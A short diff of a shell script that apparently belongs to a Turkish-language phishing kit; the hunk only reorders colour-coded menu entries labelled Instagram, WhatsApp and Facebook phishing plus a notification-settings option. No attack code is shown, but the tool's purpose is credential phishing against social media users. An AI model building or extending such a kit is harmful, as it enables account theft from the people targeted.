@@ -68,9 +68,9 @@ fi
 printf "
 \e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mİNSTAGRAM PHİSHİNG\e[97m
 
-\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mWHATSAPP PHİSHİNG\e[97m
-
 \e[31m[\e[97m3\e[31m]\e[97m ────────── \e[32mFACEBOOK PHİSHİNG\e[97m
+
+\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mWHATSAPP PHİSHİNG\e[97m
 
 \e[31m[\e[97mA\e[31m]\e[97m ────────── \e[33mBİLDİRİM AYARLARI\e[97m
 
